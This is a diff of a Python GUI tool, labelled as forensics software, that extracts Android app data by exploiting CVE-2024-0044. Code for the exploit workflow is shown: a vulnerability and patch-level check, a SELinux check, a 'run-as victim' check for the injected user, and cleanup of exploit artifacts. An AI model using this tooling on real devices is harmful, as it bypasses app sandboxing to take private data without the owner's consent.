@@ -1,1241 +1,1334 @@
 
-#!/usr/bin/env python3
-"""
-Traverso Forensics - Android Data Extraction Tool
-Enhanced version with PDF reporting and improved UI
-Uses CVE-2024-0044 for Android 12/13 data extraction
-"""
-
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext
+from tkinter import ttk, messagebox, scrolledtext, filedialog
 import subprocess
 import threading
 import os
 import time
 import hashlib
-import shutil
+import json
+import shlex
 from pathlib import Path
 from datetime import datetime
 import re
+import sys
 
-# ReportLab imports restored
-try:
-    from reportlab.lib.pagesizes import letter
-    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
-    from reportlab.lib.units import inch
-    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image as RLImage
-    from reportlab.lib import colors
-    from reportlab.lib.enums import TA_CENTER, TA_LEFT
-    REPORTLAB_AVAILABLE = True
-except ImportError:
-    REPORTLAB_AVAILABLE = False
+class ForensicVerification:
+   """
+   Forensic verification following ISO/IEC 27037:2012 guidelines
+   """
+   
+   def __init__(self, log_callback=None):
+       self.log_callback = log_callback
+   
+   def log(self, message, level="INFO"):
+       """Log with callback"""
+       if self.log_callback:
+           self.log_callback(message, level)
+       else:
+           print(f"[{level}] {message}")
+   
+   def run_adb(self, command, shell=False, timeout=30):
+       """Execute ADB command safely"""
+       try:
+           if shell:
+               cmd = ["adb", "shell"] + command.split()
+           else:
+               cmd = ["adb"] + command.split()
+           
+           result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8', errors='replace', timeout=timeout)
+           return result.stdout.strip(), result.stderr.strip(), result.returncode
+       except Exception as e:
+           return "", str(e), -1
+   
+   def check_vulnerability(self):
+       """Check if device is vulnerable to CVE-2024-0044"""
+       self.log("Checking CVE-2024-0044 vulnerability status...")
+       
+       patch_level, _, _ = self.run_adb("getprop ro.build.version.security_patch", shell=True)
+       android_version, _, _ = self.run_adb("getprop ro.build.version.release", shell=True)
+       
+       self.log(f"Android Version: {android_version}")
+       self.log(f"Security Patch: {patch_level}")
+       
+       try:
+           year, month = patch_level.split('-')[:2]
+           patch_date = int(year) * 12 + int(month)
+           
+           # March 2024 was the official patch
+           first_patch = 2024 * 12 + 3
+           
+           if patch_date >= first_patch:
+               self.log("⚠️  Device appears PATCHED (Date >= March 2024)", "WARNING")
+               self.log("    Exploit may still work due to silent patches variance", "INFO")
+           else:
+               self.log("✅ Device Security Patch predates March 2024", "SUCCESS")
+           
+           return True
+           
+       except Exception as e:
+           self.log(f"Error parsing patch: {e}", "ERROR")
+           return True
+   
+   def check_selinux(self):
+       """Check SELinux status - Forensic documentation"""
+       self.log("Checking SELinux status...")
+       selinux, _, _ = self.run_adb("getenforce", shell=True)
+       self.log(f"SELinux Mode: {selinux}")
+       
+       if selinux == "Enforcing":
+           self.log("    SELinux Enforcing may limit exploit effectiveness", "WARNING")
+       
+       return selinux
+
+   def run_pre_verification(self, package=None):
+       """Run operative pre-checks following forensic standards"""
+       self.log("="*60)
+       self.log("STARTING PRE-EXTRACTION VERIFICATION")
+       self.log("Standard: ISO/IEC 27037:2012")
+       
+       # Check vulnerability
+       self.check_vulnerability()
+       
+       # Check SELinux
+       self.check_selinux()
+       
+       # Check package exists
+       if package:
+           stdout, _, code = self.run_adb(f"pm list packages {package}", shell=True)
+           if package not in stdout:
+               self.log(f"❌ Package {package} not found on device", "ERROR")
+               return False
+           self.log(f"✅ Package {package} verified on device", "SUCCESS")
+       
+       return True
+   
+   def verify_cleanup(self):
+       """Verify temporary files cleaned - Chain of custody"""
+       self.log("Verifying device cleanup (Chain of Custody)...")
+       issues = []
+       locations = ["/data/local/tmp/"]
+       
+       for location in locations:
+           # Check for APKs
+           stdout, _, code = self.run_adb(f"ls {location}*.apk 2>/dev/null", shell=True)
+           if stdout and code == 0:
+               issues.append(f"APK in {location}")
+           
+           # Check for exploit scripts
+           stdout, _, code = self.run_adb(f"ls {location}*exploit* 2>/dev/null", shell=True)
+           if stdout and code == 0:
+               issues.append(f"Exploit script in {location}")
+       
+       if len(issues) == 0:
+           self.log("✅ Device cleanup verified - No artifacts remain", "SUCCESS")
+       else:
+           self.log(f"⚠️  Cleanup incomplete: {issues}", "WARNING")
+       
+       return len(issues) == 0
+   
+   def verify_victim_user(self):
+       """Check victim user status"""
+       stdout, stderr, code = self.run_adb("run-as victim id", shell=True)
+       if code == 0:
+           self.log("ℹ️  'victim' user active (will reset on reboot)", "INFO")
+       else:
+           self.log("✅ 'victim' user not present", "SUCCESS")
+
+   def run_post_verification(self):
+       """Run post-extraction checks following forensic standards"""
+       self.log("="*60)
+       self.log("STARTING POST-EXTRACTION VERIFICATION")
+       
+       self.verify_cleanup()
+       self.verify_victim_user()
+       
+       self.log("="*60)
 
 
-class AndroidExtractorGUI:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("Traverso Forensics - Android Data Extractor")
-        self.root.geometry("1200x750")
-        self.root.configure(bg="#1e1e1e")
-        self.root.resizable(True, True)
-        
-        self.device_connected = tk.BooleanVar(value=False)
-        self.selected_package = tk.StringVar()
-        self.selected_uid = tk.StringVar()
-        self.selected_user_id = tk.StringVar(value="0")
-        self.device_info = {}
-        self.apps_list = []
-        self.log_file = None
-        self.log_entries = []
-        self.extraction_start_time = None
-        self.extraction_data = {}
-        self.extraction_dir = None
-        self.setup_styles()
-        self.create_header()
-        self.create_main_panels()
-        self.create_footer()
-    
-    def create_log_file(self, extraction_dir):
-        timestamp = time.strftime("%Y%m%d_%H%M%S")
-        self.log_file = os.path.join(extraction_dir, f"extraction_log_{timestamp}.txt")
-        with open(self.log_file, 'w', encoding='utf-8') as f:
-            f.write("=" * 80 + "\n")
-            f.write("TRAVERSO FORENSICS - Android App Extraction Log\n")
-            f.write("=" * 80 + "\n")
-            f.write(f"Session started: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
-            f.write(f"Log file: {self.log_file}\n")
-            f.write("=" * 80 + "\n\n")
-    
-    def write_log(self, message, level="INFO"):
-        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-        log_entry = f"[{timestamp}] [{level}] {message}"
-        self.log_entries.append({"timestamp": timestamp, "level": level, "message": message})
-        if self.log_file:
-            try:
-                with open(self.log_file, 'a', encoding='utf-8') as f:
-                    f.write(log_entry + "\n")
-            except Exception as e:
-                print(f"Error writing to log: {e}")
-    
-    def update_progress(self, step, total, message):
-        percentage = (step / total) * 100
-        self.root.after(0, lambda: self.progress.configure(value=percentage))
-        self.root.after(0, lambda: self.progress_label.config(text=message))
-    
-    def get_device_info(self):
-        info = {}
-        commands = {
-            'dev_name': 'getprop ro.product.model',
-            'model': 'getprop ro.product.model',
-            'product': 'getprop ro.product.name',
-            'software': 'getprop ro.build.version.release',
-            'build_nr': 'getprop ro.build.display.id',
-            'hardware': 'getprop ro.hardware',
-            'serialnr': 'getprop ro.serialno',
-            'IMEI': 'getprop ro.gsm.imei',
-            'capacity': 'df /data | tail -1',
-            'language': 'getprop persist.sys.locale',
-        }
-        
-        for key, cmd in commands.items():
-            stdout, _, code = self.run_adb_command(cmd, shell=True)
-            if code == 0:
-                if key == 'capacity':
-                    parts = stdout.split()
-                    if len(parts) >= 2:
-                        total_kb = int(parts[1]) if parts[1].isdigit() else 0
-                        info['capacity'] = f"{total_kb / 1024 / 1024:.2f} GB"
-                        used_kb = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 0
-                        free_kb = total_kb - used_kb
-                        info['free_space'] = f"{free_kb / 1024 / 1024:.2f} GB"
-                else:
-                    info[key] = stdout.strip()
-        
-        info['imei'] = self.get_imei()
-        
-        stdout, _, code = self.run_adb_command("cat /sys/class/net/wlan0/address", shell=True)
-        if code == 0:
-            info['wifi_mac'] = stdout.strip()
-        
-        stdout, _, code = self.run_adb_command("settings get secure bluetooth_address", shell=True)
-        if code == 0:
-            info['bt_mac'] = stdout.strip()
-        
-        return info
-    
-    def get_imei(self):
-        if self.log_file:
-            self.write_log("Intentando método 1: gsm.baseband.imei", "INFO")
-        stdout, _, code = self.run_adb_command("getprop gsm.baseband.imei", shell=True)
-        if code == 0:
-            imei = self._clean_imei(stdout)
-            if self._is_valid_imei(imei):
-                return imei
-        
-        whoami, _, _ = self.run_adb_command("whoami", shell=True)
-        if whoami and "phablet" in whoami.lower():
-            imei = self._get_imei_ubuntu_touch()
-            if self._is_valid_imei(imei):
-                return imei
-        
-        stdout, _, code = self.run_adb_command("getprop ro.gsm.imei", shell=True)
-        if code == 0:
-            imei = self._clean_imei(stdout)
-            if self._is_valid_imei(imei):
-                return imei
-        
-        stdout, _, code = self.run_adb_command("getprop ril.imei", shell=True)
-        if code == 0:
-            imei = self._clean_imei(stdout)
-            if self._is_valid_imei(imei):
-                return imei
-        
-        imei = self._get_imei_from_dumpsys()
-        if self._is_valid_imei(imei):
-            return imei
-        
-        android_version = self._get_android_version()
-        if android_version >= 5:
-            imei = self._get_imei_from_service_call()
-            if self._is_valid_imei(imei):
-                return imei
-        
-        return 'N/A'
-    
-    def _clean_imei(self, imei_value):
-        if not imei_value:
-            return ""
-        return imei_value.replace("'", "").replace('"', '').strip()
-    
-    def _is_valid_imei(self, imei):
-        if not imei or imei == "-" or imei == "":
-            return False
-        invalid_patterns = ["not found", "service", "000000", "null", "unknown", "n/a"]
-        if any(pattern in imei.lower() for pattern in invalid_patterns):
-            return False
-        if not imei.isdigit():
-            return False
-        if len(imei) not in [14, 15]:
-            return False
-        return True
-    
-    def _get_imei_from_dumpsys(self):
-        try:
-            stdout, stderr, code = self.run_adb_command("dumpsys iphonesubinfo", shell=True)
-            if code != 0 or not stdout:
-                return ""
-            match = re.search(r"Device ID\s*=\s*(\d+)", stdout)
-            if match:
-                return match.group(1)
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Error en dumpsys iphonesubinfo: {e}", "WARNING")
-        return ""
-    
-    def _get_imei_from_service_call(self):
-        try:
-            stdout, stderr, code = self.run_adb_command(
-                "service call iphonesubinfo 1 s16 com.android.shell | cut -c 50-66 | tr -d '.[:space:]'",
-                shell=True
-            )
-            if code == 0 and stdout:
-                imei = self._clean_imei(stdout)
-                if imei:
-                    return imei
-            
-            stdout, stderr, code = self.run_adb_command(
-                "service call iphonesubinfo 1 s16 com.android.shell",
-                shell=True
-            )
-            if code != 0 or not stdout:
-                return ""
-            imei_chars = []
-            for line in stdout.split('\n'):
-                matches = re.findall(r"'(.)'", line)
-                imei_chars.extend(matches)
-            imei = ''.join(imei_chars).strip()
-            return imei if imei else ""
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Error en service call: {e}", "WARNING")
-        return ""
-    
-    def _get_android_version(self):
-        try:
-            stdout, _, code = self.run_adb_command(
-                "getprop ro.build.version.release", 
-                shell=True
-            )
-            if code == 0 and stdout:
-                version_str = stdout.strip().split(".")[0]
-                return int(version_str)
-        except Exception as e:
-            pass
-        return 0
-    
-    def _get_imei_ubuntu_touch(self):
-        try:
-            stdout, stderr, code = self.run_adb_command(
-                'dbus-send --system --print-reply --dest=org.ofono /ril_0 org.ofono.Modem.GetProperties',
-                shell=True
-            )
-            if code != 0 or not stdout:
-                return ""
-            match = re.search(r'"(\d{14,17})"', stdout)
-            if match:
-                return match.group(1)
-        except Exception as e:
-            pass
-        return ""
-    
-    def should_show_app(self, app):
-        package = app["package"]
-        filter_type = self.app_filter.get()
-        system_prefixes = ["com.android", "com.google", "android", "com.samsung"]
-        is_system = any(package.startswith(prefix) for prefix in system_prefixes)
-        
-        if filter_type == "all":
-            return True
-        elif filter_type == "third_party":
-            return not is_system
-        elif filter_type == "native":
-            return is_system
-        return False
-    
-    def perform_search(self):
-        try:
-            self.filter_apps()
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Error in search: {e}", "ERROR")
-    
-    def clear_search_now(self):
-        self.search_var.set("")
-        try:
-            self.filter_apps()
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Error clearing search: {e}", "ERROR")
-    
-    def filter_apps(self):
-        try:
-            if not hasattr(self, 'apps_listbox') or not hasattr(self, 'apps_list'):
-                return
-            if not self.apps_list:
-                return
-            
-            search_term = ""
-            if hasattr(self, 'search_var'):
-                search_term = self.search_var.get().strip().lower()
-            
-            self.apps_listbox.delete(0, tk.END)
-            
-            for app in self.apps_list:
-                package = app["package"]
-                uid = app["uid"]
-                
-                if not self.should_show_app(app):
-                    continue
-                if search_term and search_term not in package.lower():
-                    continue
-                
-                display = f"package:{package} uid:{uid}"
-                self.apps_listbox.insert(tk.END, display)
-            
-            self.apps_listbox.update()
-            self.root.update_idletasks()
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Error in filter_apps: {e}", "ERROR")
-    
-    def setup_styles(self):
-        style = ttk.Style()
-        style.theme_use('clam')
-        
-        self.bg_dark = "#1e1e1e"
-        self.bg_panel = "#2d2d2d"
-        self.bg_input = "#3d3d3d"
-        self.fg_text = "#ffffff"
-        self.fg_secondary = "#b0b0b0"
-        self.accent_green = "#4a9d5f"
-        self.accent_blue = "#2196F3"
-        self.accent_orange = "#ff8c00"
-        
-        style.configure("blue.Horizontal.TProgressbar",
-                       troughcolor=self.bg_input,
-                       bordercolor=self.bg_panel,
-                       background=self.accent_blue,
-                       lightcolor=self.accent_blue,
-                       darkcolor=self.accent_blue)
-    
-    def create_header(self):
-        header_frame = tk.Frame(self.root, bg=self.bg_dark, height=120)
-        header_frame.pack(fill=tk.X, padx=0, pady=0)
-        header_frame.pack_propagate(False)
-        
-        left_frame = tk.Frame(header_frame, bg=self.bg_dark)
-        left_frame.pack(side=tk.LEFT, padx=20, pady=10)
-        
-        try:
-            from PIL import Image, ImageTk
-            if os.path.exists("traverso_logo.png"):
-                img = Image.open("traverso_logo.png")
-                aspect_ratio = img.width / img.height
-                new_height = 100
-                new_width = int(new_height * aspect_ratio)
-                img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)
-                photo = ImageTk.PhotoImage(img)
-                logo_label = tk.Label(left_frame, image=photo, bg=self.bg_dark)
-                logo_label.image = photo
-                logo_label.pack()
-            else:
-                tk.Label(left_frame, text="Traverso FORENSICS Logo Not Found", 
-                        font=("Segoe UI", 12, "bold"),
-                        foreground=self.accent_orange,
-                        background=self.bg_dark).pack()
-        except Exception as e:
-            tk.Label(left_frame, text="Traverso FORENSICS", 
-                    font=("Segoe UI", 12, "bold"),
-                    foreground=self.fg_text,
-                    background=self.bg_dark).pack()
-        
-        right_frame = tk.Frame(header_frame, bg=self.bg_dark)
-        right_frame.pack(side=tk.RIGHT, padx=20, pady=10)
-        
-        info_labels = ["For Android 12 and 13", "No Downgrade", "No Root"]
-        for i, text in enumerate(info_labels):
-            tk.Label(right_frame, text=text, font=("Segoe UI", 9),
-                    foreground=self.fg_secondary, background=self.bg_dark).grid(row=0, column=i*2, padx=10)
-            if i < len(info_labels) - 1:
-                tk.Label(right_frame, text="|", foreground=self.fg_secondary,
-                        background=self.bg_dark).grid(row=0, column=i*2+1, padx=5)
-        
-        tk.Label(right_frame, text="Android App Extraction 1.0", font=("Segoe UI", 11, "bold"),
-                foreground=self.accent_green, background=self.bg_dark).grid(row=1, column=0, columnspan=26, pady=(26,0))
-    
-    def create_main_panels(self):
-        main_container = tk.Frame(self.root, bg=self.bg_dark)
-        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
-        
-        left_panel = self.create_left_panel(main_container)
-        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
-        
-        right_panel = self.create_right_panel(main_container)
-        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
-    
-    def create_left_panel(self, parent):
-        panel = tk.Frame(parent, bg=self.bg_panel, relief=tk.FLAT, borderwidth=1)
-        
-        tk.Label(panel, text="Package Information", font=("Segoe UI", 11, "bold"),
-                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
-        
-        uid_frame = tk.Frame(panel, bg=self.bg_panel)
-        uid_frame.pack(fill=tk.X, padx=15, pady=5)
-        tk.Label(uid_frame, text="UIDs:", font=("Segoe UI", 10),
-                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
-        self.uids_label = tk.Label(uid_frame, text="", font=("Segoe UI", 10),
-                                   foreground=self.accent_orange, background=self.bg_panel)
-        self.uids_label.pack(side=tk.LEFT, padx=10)
-        
-        pkg_frame = tk.Frame(panel, bg=self.bg_panel)
-        pkg_frame.pack(fill=tk.X, padx=15, pady=5)
-        tk.Label(pkg_frame, text="Package:", font=("Segoe UI", 10),
-                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT)
-        self.package_label = tk.Label(pkg_frame, text="", font=("Segoe UI", 10),
-                                      foreground=self.accent_orange, background=self.bg_panel)
-        self.package_label.pack(side=tk.LEFT, padx=10)
-        
-        buttons_frame = tk.Frame(panel, bg=self.bg_panel)
-        buttons_frame.pack(fill=tk.X, padx=15, pady=15)
-        
-        # BOTÓN VERDE AL INICIO
-        self.detect_btn = tk.Button(buttons_frame, text="Detect Device", bg=self.accent_green, fg=self.fg_text,
-                                    font=("Segoe UI", 9, "bold"), relief=tk.FLAT, padx=15, pady=10,
-                                    cursor="hand2", command=self.check_device)
-        self.detect_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
-        
-        self.listapps_btn = tk.Button(buttons_frame, text="List Apps", bg=self.bg_input, fg=self.fg_text,
-                                      font=("Segoe UI", 9), relief=tk.FLAT, padx=15, pady=10,
-                                      cursor="hand2", command=self.list_all_apps, state=tk.DISABLED)
-        self.listapps_btn.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(5, 0))
-        
-        tk.Label(panel, text="List of devices attached", font=("Segoe UI", 10),
-                foreground=self.fg_secondary, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(5,0))
-        
-        self.device_text = tk.Text(panel, bg=self.bg_input, fg=self.fg_text, font=("Consolas", 9),
-                                   height=4, relief=tk.FLAT, borderwidth=0)
-        self.device_text.pack(fill=tk.X, padx=15, pady=5)
-        
-        tk.Label(panel, text="List Apps", font=("Segoe UI", 11, "bold"),
-                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 5))
-        
-        radio_frame = tk.Frame(panel, bg=self.bg_panel)
-        radio_frame.pack(fill=tk.X, padx=15, pady=5)
-        
-        self.app_filter = tk.StringVar(value="third_party")
-        
-        tk.Radiobutton(radio_frame, text="Third Party Applications", variable=self.app_filter, value="third_party",
-                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
-                      activebackground=self.bg_panel, activeforeground=self.fg_text,
-                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
-        
-        tk.Radiobutton(radio_frame, text="Native Applications", variable=self.app_filter, value="native",
-                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
-                      activebackground=self.bg_panel, activeforeground=self.fg_text,
-                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
-        
-        tk.Radiobutton(radio_frame, text="All Applications", variable=self.app_filter, value="all",
-                      bg=self.bg_panel, fg=self.fg_text, selectcolor=self.bg_input,
-                      activebackground=self.bg_panel, activeforeground=self.fg_text,
-                      font=("Segoe UI", 9), command=self.filter_apps).pack(anchor=tk.W, pady=2)
-        
-        search_frame = tk.Frame(panel, bg=self.bg_panel)
-        search_frame.pack(fill=tk.X, padx=15, pady=(10, 5))
-        
-        tk.Label(search_frame, text="Search:", font=("Segoe UI", 9),
-                foreground=self.fg_text, background=self.bg_panel).pack(side=tk.LEFT, padx=(0, 5))
-        
-        self.search_var = tk.StringVar()
-        self.search_var.trace("w", lambda *args: self.perform_search())
-        
-        self.search_entry = tk.Entry(search_frame, textvariable=self.search_var, bg=self.bg_input,
-                                     fg=self.fg_text, font=("Segoe UI", 9), relief=tk.FLAT,
-                                     insertbackground=self.fg_text)
-        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=5)
-        
-        tk.Button(search_frame, text="✕", bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 10),
-                 relief=tk.FLAT, padx=8, pady=2, cursor="hand2",
-                 command=self.clear_search_now).pack(side=tk.LEFT, padx=(5, 0))
-        
-        list_frame = tk.Frame(panel, bg=self.bg_panel)
-        list_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
-        
-        scrollbar = tk.Scrollbar(list_frame, bg=self.bg_input)
-        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
-        
-        self.apps_listbox = tk.Listbox(list_frame, bg=self.bg_input, fg=self.fg_text, font=("Consolas", 9),
-                                       relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
-                                       selectforeground="white", yscrollcommand=scrollbar.set)
-        self.apps_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
-        scrollbar.config(command=self.apps_listbox.yview)
-        self.apps_listbox.bind('<<ListboxSelect>>', self.on_app_select)
-        
-        return panel
-    
-    def create_right_panel(self, parent):
-        panel = tk.Frame(parent, bg=self.bg_panel, relief=tk.FLAT, borderwidth=1)
-        
-        tk.Label(panel, text="Exploiting Vulnerability", font=("Segoe UI", 11, "bold"),
-                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(15, 10))
-        
-        top_frame = tk.Frame(panel, bg=self.bg_panel)
-        top_frame.pack(fill=tk.X, padx=15, pady=10)
-        
-        try:
-            from PIL import Image, ImageTk
-            if os.path.exists("android_logo.png"):
-                img = Image.open("android_logo.png")
-                img = img.resize((100, 100), Image.Resampling.LANCZOS)
-                photo = ImageTk.PhotoImage(img)
-                logo_label = tk.Label(top_frame, image=photo, bg=self.bg_panel)
-                logo_label.image = photo
-                logo_label.pack(side=tk.RIGHT, padx=20)
-            else:
-                tk.Label(top_frame, text="🤖", font=("Segoe UI", 70),
-                        bg=self.bg_panel, fg=self.accent_green).pack(side=tk.RIGHT, padx=20)
-        except:
-            tk.Label(top_frame, text="🤖", font=("Segoe UI", 70),
-                    bg=self.bg_panel, fg=self.accent_green).pack(side=tk.RIGHT, padx=20)
-        
-        tables_container = tk.Frame(panel, bg=self.bg_panel)
-        tables_container.pack(fill=tk.X, padx=15, pady=15)
-        
-        users_frame = tk.Frame(tables_container, bg=self.bg_input)
-        users_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
-        tk.Label(users_frame, text="Users", font=("Segoe UI", 9, "bold"),
-                background=self.bg_input, foreground=self.fg_text).pack(pady=5)
-        self.users_listbox = tk.Listbox(users_frame, bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
-                                        relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
-                                        selectforeground="white", height=3)
-        self.users_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
-        self.users_listbox.bind('<<ListboxSelect>>', self.on_user_select)
-        
-        uids_frame = tk.Frame(tables_container, bg=self.bg_input)
-        uids_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
-        tk.Label(uids_frame, text="UIDs", font=("Segoe UI", 9, "bold"),
-                background=self.bg_input, foreground=self.fg_text).pack(pady=5)
-        self.uids_listbox = tk.Listbox(uids_frame, bg=self.bg_input, fg=self.fg_text, font=("Segoe UI", 9),
-                                       relief=tk.FLAT, borderwidth=0, selectbackground=self.accent_blue,
-                                       selectforeground="white", height=3)
-        self.uids_listbox.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
-        self.uids_listbox.bind('<<ListboxSelect>>', self.on_uid_select)
-        
-        self.progress = ttk.Progressbar(panel, mode='determinate', length=300, style="blue.Horizontal.TProgressbar")
-        self.progress.pack(fill=tk.X, padx=15, pady=(10, 5))
-        
-        self.progress_label = tk.Label(panel, text="", bg=self.bg_panel, fg=self.fg_text, font=("Segoe UI", 9))
-        self.progress_label.pack(fill=tk.X, padx=15, pady=(0, 10))
-        
-        self.start_btn = tk.Button(panel, text="Start Extraction", bg=self.bg_input, fg=self.fg_text,
-                                   font=("Segoe UI", 10, "bold"), relief=tk.FLAT, padx=20, pady=12,
-                                   cursor="hand2", command=self.start_extraction, state=tk.DISABLED)
-        self.start_btn.pack(fill=tk.X, padx=15, pady=10)
-        
-        tk.Label(panel, text="Extracted Files", font=("Segoe UI", 10, "bold"),
-                foreground=self.fg_text, background=self.bg_panel).pack(anchor=tk.W, padx=15, pady=(10, 5))
-        
-        table_frame = tk.Frame(panel, bg=self.bg_input)
-        table_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 15))
-        
-        headers_frame = tk.Frame(table_frame, bg=self.bg_input)
-        headers_frame.pack(fill=tk.X, padx=5, pady=5)
-        
-        tk.Label(headers_frame, text="Name", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
-                fg=self.fg_secondary, width=40, anchor=tk.W).pack(side=tk.LEFT, padx=2)
-        tk.Label(headers_frame, text="Modified Date", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
-                fg=self.fg_secondary, width=20, anchor=tk.W).pack(side=tk.LEFT, padx=2)
-        tk.Label(headers_frame, text="Type", font=("Segoe UI", 9, "bold"), bg=self.bg_input,
-                fg=self.fg_secondary, width=15, anchor=tk.W).pack(side=tk.LEFT, padx=2)
-        
-        self.files_text = scrolledtext.ScrolledText(table_frame, bg=self.bg_input, fg=self.fg_text,
-                                                    font=("Consolas", 9), relief=tk.FLAT,
-                                                    borderwidth=0, height=8)
-        self.files_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=(0, 5))
-        self.files_text.insert(1.0, "This folder is empty.")
-        self.files_text.config(state=tk.DISABLED)
-        
-        return panel
-    
-    def create_footer(self):
-        footer = tk.Frame(self.root, bg=self.bg_dark, height=30)
-        footer.pack(fill=tk.X, side=tk.BOTTOM)
-        footer.pack_propagate(False)
-        tk.Label(footer, text="Developer: Miguel Ángel Alfredo TRAVERSO - 2026",
-                font=("Segoe UI", 8), foreground=self.fg_secondary,
-                background=self.bg_dark).pack(side=tk.LEFT, padx=10)
-    
-    def run_adb_command(self, command, shell=False, timeout=30):
-        try:
-            if shell:
-                full_command = ["adb", "shell"] + command.split()
-            else:
-                full_command = ["adb"] + command.split()
-            
-            if self.log_file:
-                self.write_log(f"Executing command: {' '.join(full_command)}")
-            
-            result = subprocess.run(full_command, capture_output=True, text=True, timeout=timeout)
-            
-            if self.log_file:
-                if result.returncode == 0:
-                    self.write_log(f"Command successful: {command}")
-                else:
-                    self.write_log(f"Command failed: {command} - Error: {result.stderr}", "ERROR")
-            
-            return result.stdout, result.stderr, result.returncode
-        except Exception as e:
-            if self.log_file:
-                self.write_log(f"Exception executing command: {command} - {str(e)}", "ERROR")
-            return None, str(e), 1
-    
-    def check_device(self):
-        self.device_text.delete(1.0, tk.END)
-        
-        def check():
-            stdout, stderr, code = self.run_adb_command("devices")
-            
-            if code != 0:
-                self.device_text.insert(1.0, "ADB is not installed or not in PATH")
-                self.device_connected.set(False)
-                return
-            
-            lines = stdout.strip().split('\n')
-            if len(lines) < 2 or "device" not in lines[1]:
-                self.device_text.insert(1.0, "No device connected")
-                self.device_connected.set(False)
-                return
-            
-            self.device_connected.set(True)
-            device_line = lines[1]
-            self.device_text.insert(tk.END, device_line)
-            self.extraction_data = self.get_device_info()
-            
-            # CAMBIO A GRIS AL DETECTAR
-            self.root.after(0, lambda: self.detect_btn.config(bg=self.bg_input, state=tk.DISABLED))
-            self.root.after(0, lambda: self.listapps_btn.config(state=tk.NORMAL, bg=self.accent_green))
-        
-        threading.Thread(target=check, daemon=True).start()
-    
-    def list_all_apps(self):
-        if not self.device_connected.get():
-            messagebox.showwarning("Device Not Connected", "Please connect a device first")
-            return
-        
-        def list_apps():
-            stdout, stderr, code = self.run_adb_command("pm list packages -U", shell=True)
-            if code != 0:
-                return
-            
-            self.apps_list = []
-            for line in stdout.strip().split('\n'):
-                if line and "package:" in line:
-                    parts = line.split()
-                    if len(parts) >= 2:
-                        package = parts[0].replace("package:", "")
-                        uid = parts[1].replace("uid:", "") if "uid:" in parts[1] else "N/A"
-                        self.apps_list.append({"package": package, "uid": uid})
-            
-            self.root.after(0, self.filter_apps)
-        
-        threading.Thread(target=list_apps, daemon=True).start()
-    
-    def on_app_select(self, event):
-        selection = self.apps_listbox.curselection()
-        if not selection:
-            return
-        
-        line = self.apps_listbox.get(selection[0])
-        parts = line.split()
-        package = parts[0].replace("package:", "")
-        uid = parts[1].replace("uid:", "")
-        
-        self.selected_package.set(package)
-        self.selected_uid.set(uid)
-        self.package_label.config(text=package)
-        self.uids_label.config(text=uid)
-        
-        self.users_listbox.delete(0, tk.END)
-        self.users_listbox.insert(tk.END, "0")
-        self.uids_listbox.delete(0, tk.END)
-        self.uids_listbox.insert(tk.END, uid)
-        self.start_btn.config(state=tk.NORMAL, bg=self.accent_green)
-    
-    def on_user_select(self, event):
-        selection = self.users_listbox.curselection()
-        if selection:
-            self.uids_listbox.selection_clear(0, tk.END)
-            self.uids_listbox.selection_set(selection[0])
-    
-    def on_uid_select(self, event):
-        selection = self.uids_listbox.curselection()
-        if selection:
-            self.users_listbox.selection_clear(0, tk.END)
-            self.users_listbox.selection_set(selection[0])
-    
-    def calculate_hash256(self, filepath):
-        sha256_hash = hashlib.sha256()
-        with open(filepath, "rb") as f:
-            for byte_block in iter(lambda: f.read(4096), b""):
-                sha256_hash.update(byte_block)
-        return sha256_hash.hexdigest()
-    
-    # METODO RESTAURADO PARA GENERAR REPORTE PDF
-    def generate_pdf_report(self, extraction_dir, package_name, uid):
-        if not REPORTLAB_AVAILABLE:
-            self.write_log("ReportLab not available, skipping PDF generation", "WARNING")
-            return None
-        
-        try:
